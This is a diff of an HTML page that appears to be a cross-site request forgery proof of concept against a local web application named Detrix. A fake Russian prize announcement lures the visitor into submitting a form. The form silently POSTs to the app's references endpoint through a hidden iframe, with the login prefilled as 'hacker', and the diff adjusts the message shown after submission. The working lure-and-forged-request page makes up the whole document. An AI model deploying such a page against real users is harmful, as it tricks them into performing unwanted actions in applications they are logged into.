@@ -3,7 +3,7 @@
   <body>
   <iframe visible=false width="0" height="0" frameborder="0" border="0" name="dummyframe" id="dummyframe"></iframe>
   <br><h1>Поздравляем, вы выиграли миллион! <br>Зарегистрируйтесь для получения денег!</h1>
-    <form action="http://detrix.local:8765/references/add/1" method="POST" enctype="multipart/form-data" target="dummyframe" onsubmit="document.body.innerHTML = '<br><h1>Поздравляем!</h1><br>Проверьте админку...'">
+    <form action="http://detrix.local:8765/references/add/1" method="POST" enctype="multipart/form-data" target="dummyframe" onsubmit="alert('Поздравляем!\nПроверьте админку...')">
       <br>Придумайте логин (желательно уникальный, вас много а Detrix один):<br>
       <input type="text" name="login" value="hacker" id="login"/><br>
       <br>Придумайте пароль (можно не менять):<br>
@@ -41,4 +41,3 @@
   </script>
   </body>
 </html>
-
